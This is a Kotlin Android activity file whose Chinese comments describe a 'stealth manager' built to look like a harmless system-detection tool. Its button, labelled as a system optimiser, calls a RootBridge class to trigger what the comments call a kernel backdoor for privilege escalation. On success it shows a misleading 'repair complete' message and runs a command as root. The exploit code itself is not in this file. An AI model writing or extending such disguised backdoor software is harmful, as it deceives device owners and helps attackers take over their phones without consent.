package com.stealth.manager

import android.graphics.Color
import android.os.Bundle
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity

/**
 * MainActivity: 隐形管理器的交互界面
 * 1. 伪装外观：看起来像一个简单的系统检测工具
 * 2. 核心功能：点击按钮调用 RootBridge 触发内核后门
 */
class MainActivity : AppCompatActivity() {

    private lateinit var statusText: TextView
    private lateinit var infoText: TextView
    private lateinit var actionButton: Button

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // 动态创建一个简单的 UI 界面（也可以使用 layout XML）
        setContentView(createPlaceholderUI())

        updateStatus()

        actionButton.setOnClickListener {
            // 尝试触发内核提权
            val success = RootBridge.isRootSuccessful()
            
            if (success) {
                statusText.text = "状态: 系统权限已接管"
                statusText.setTextColor(Color.GREEN)
                actionButton.isEnabled = false
                actionButton.text = "修复完成"
                
                // 执行一个测试指令，证明权限
                val kernelInfo = RootBridge.executeCommand("uname -a")
                infoText.text = "内核信息:\n$kernelInfo"
            } else {
                statusText.text = "状态: 环境不匹配"
                statusText.setTextColor(Color.RED)
            }
        }
    }

    private fun updateStatus() {
        // 初始检查当前进程的真实 UID
        val currentUid = android.os.Process.myUid()
        infoText.text = "当前进程 UID: $currentUid\n设备架构: SM8650 (arm64-v8a)"
        
        if (currentUid == 0) {
            statusText.text = "状态: 已处于最高权限"
            statusText.setTextColor(Color.GREEN)
        } else {
            statusText.text = "状态: 待检测"
        }
    }

    /**
     * 简单的 UI 构建逻辑（伪装成系统工具风格）
     */
    private fun createPlaceholderUI(): android.view.View {
        val root = android.widget.LinearLayout(this).apply {
            orientation = android.widget.LinearLayout.VERTICAL
            setPadding(50, 50, 50, 50)
            gravity = android.view.Gravity.CENTER_HORIZONTAL
        }

        statusText = TextView(this).apply {
            textSize = 20f
            setPadding(0, 50, 0, 50)
        }
        
        infoText = TextView(this).apply {
            textSize = 14f
            setTextColor(Color.GRAY)
            setPadding(0, 0, 0, 80)
        }

        actionButton = Button(this).apply {
            text = "检测并优化系统环境"
        }

        root.addView(statusText)
        root.addView(infoText)
        root.addView(actionButton)
        return root
    }
}